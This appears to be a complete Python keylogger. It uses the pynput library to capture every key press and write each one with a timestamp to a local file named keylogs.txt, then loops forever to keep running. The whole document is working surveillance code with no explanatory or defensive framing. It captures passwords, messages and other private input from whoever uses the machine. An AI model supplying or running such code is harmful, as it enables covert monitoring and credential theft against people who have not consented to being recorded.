from pynput import keyboard
import logging

logging.basicConfig(filename="keylogs.txt", level=logging.DEBUG, format="%(asctime)s - %(message)s")

def on_press(key):
    try:
        logging.info(str(key))
    except Exception as e:
        logging.error(f"Error logging key: {e}")

listener = keyboard.Listener(on_press=on_press)
listener.start()

while True:
    pass